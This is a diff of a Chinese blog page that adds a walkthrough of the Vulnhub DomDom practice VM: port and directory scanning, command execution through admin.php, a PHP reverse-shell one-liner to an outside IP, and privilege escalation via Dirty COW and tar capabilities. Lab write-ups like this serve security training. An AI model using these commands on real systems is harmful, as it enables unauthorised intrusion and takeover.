@@ -12,7 +12,7 @@
 
 
 
-<title>vulhub靶机—Connect-the-dots | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+<title>vulhub靶机—DomDom | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
 
 
 
@@ -155,11 +155,75 @@
             <div class="container">
     
     
+        <div class="post-toc">
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
+    </div>
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a onclick="go_top()">△ 顶部</a>
+        <a onclick="go_bottom()">▽ 底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "▼ 收起目录"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "▶︎ 展开目录"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
 
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">vulhub靶机—Connect-the-dots</h1>
+            <h1 class="post-title">vulhub靶机—DomDom</h1>
             
                 <div class="post-meta">
                     
@@ -185,7 +249,7 @@
                         </span>
                     
                     
-                    <span id="/2022/05/05/22-0505-02/" class="leancloud-visitors view" data-flag-title="vulhub靶机—Connect-the-dots">
+                    <span id="/2022/05/05/22-0505-02/" class="leancloud-visitors view" data-flag-title="vulhub靶机—DomDom">
                         <text class="post-meta-item-text">
                             <!--阅读数:-->
                             <i class="iconfont icon-view"></i>
@@ -199,7 +263,62 @@
         </header>
 
         <div class="post-content">
-            
+            <blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/domdom-1,328/">https://www.vulnhub.com/entry/domdom-1,328/</a><br>kali的ip：192.168.43.212<br>靶机的ip：192.168.43.39</p>
+</blockquote>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描目标网段得到目标ip</p>
+<img src="/2022/05/05/22-0505-02/image-20220509203929240.png" alt="image-20220509203929240" style="zoom:80%;">
+
+<p>nmap探测目标端口信息，就开放了80端口</p>
+<p><code>nmap -p- -T5 192.168.43.39</code></p>
+<img src="/2022/05/05/22-0505-02/image-20220509204126495.png" alt="image-20220509204126495" style="zoom:80%;">
+
+<p>扫描目录，这里扫描后缀为php的文件</p>
+<p><code>gobuster dir -u http://192.168.43.39 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php</code></p>
+<img src="/2022/05/05/22-0505-02/image-20220509204536355.png" alt="image-20220509204536355" style="zoom:80%;">
+
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>访问 <code>http://192.168.43.39/index.php</code>抓包</p>
+<img src="/2022/05/05/22-0505-02/image-20220509205320917.png" alt="image-20220509205320917" style="zoom:80%;">
+
+<p>修改access&#x3D;id后，也没有发现可执行命令的地方</p>
+<img src="/2022/05/05/22-0505-02/image-20220509205422357.png" alt="image-20220509205422357" style="zoom:80%;">
+
+<p>把Post &#x2F;index.php，修改成 Post &#x2F;admin.php，发现命令执行</p>
+<img src="/2022/05/05/22-0505-02/image-20220509205528947.png" alt="image-20220509205528947" style="zoom:80%;">
+
+<p>然后加上参数，执行id命令</p>
+<img src="/2022/05/05/22-0505-02/image-20220509205626436.png" alt="image-20220509205626436" style="zoom:80%;">
+
+<p>然后通过命令执行反弹shell，通过php反弹，ctrl+u进行编码</p>
+<p><code>php -r &#39;$sock=fsockopen(&quot;192.168.0.118&quot;,9001);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
+<img src="/2022/05/05/22-0505-02/image-20220509210036690.png" alt="image-20220509210036690" style="zoom:80%;">
+
+<p>切换python shell</p>
+<p><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<img src="/2022/05/05/22-0505-02/image-20220509210721798.png" alt="image-20220509210721798" style="zoom:80%;">
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="脏牛漏洞提权"><a href="#脏牛漏洞提权" class="headerlink" title="脏牛漏洞提权"></a>脏牛漏洞提权</h2><p>这里直接利用辅助提权工具 <a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
+<p>把工具上传到目标靶机上</p>
+<img src="/2022/05/05/22-0505-02/image-20220509211326831.png" alt="image-20220509211326831" style="zoom:80%;">
+
+<p>加上执行权限，执行提权脚本，发现可以利用脏牛漏洞提权，直接下载脚本，然后上传到靶机提权即可</p>
+<img src="/2022/05/05/22-0505-02/image-20220509211633281.png" alt="image-20220509211633281" style="zoom:80%;">
+
+<h2 id="Capabilities提权"><a href="#Capabilities提权" class="headerlink" title="Capabilities提权"></a>Capabilities提权</h2><p><code>getcap -r / 2&gt;/dev/null</code></p>
+<img src="/2022/05/05/22-0505-02/image-20220509211817792.png" alt="image-20220509211817792" style="zoom:80%;">
+
+<p>利用&#x2F;bin&#x2F;tar命令打包&#x2F;home&#x2F;domom目录<code>tar -cvf domom.tar /home/domom</code></p>
+<img src="/2022/05/05/22-0505-02/image-20220509212040787.png" alt="image-20220509212040787" style="zoom:80%;">
+
+<p>解压domom.tar文件<code>tar -xvf domom.tar</code>得到home目录</p>
+<img src="/2022/05/05/22-0505-02/image-20220509212453136.png" alt="image-20220509212453136" style="zoom:80%;">
+
+<p>进入home下的domom用户下</p>
+<img src="/2022/05/05/22-0505-02/image-20220509212532050.png" alt="image-20220509212532050" style="zoom:80%;">
+
+<p>进入Desktop文件下，查看README.md发现root用户的密码</p>
+<img src="/2022/05/05/22-0505-02/image-20220509212632845.png" alt="image-20220509212632845" style="zoom:80%;">
+
         </div>		
 		
         <section class="post-tags">
@@ -207,6 +326,13 @@
                 <span>标签:</span>
                 <span class="tag">
                     
+                    
+                        <a href="/tags/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/">
+                            <i class="iconfont icon-tag1"></i>
+                            脏牛提权
+                        </a>
+                    
+                        
                 </span>
             </div>
             <div>
@@ -224,6 +350,8 @@
             </div>
         </section>
         <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/05/06/22-0506-01/">tcp/ip网络编程（期末考试）</a>
             
             
             <a class="next" rel="next" href="/2022/05/05/22-0505-01/">ipc+计划任务横向</a>
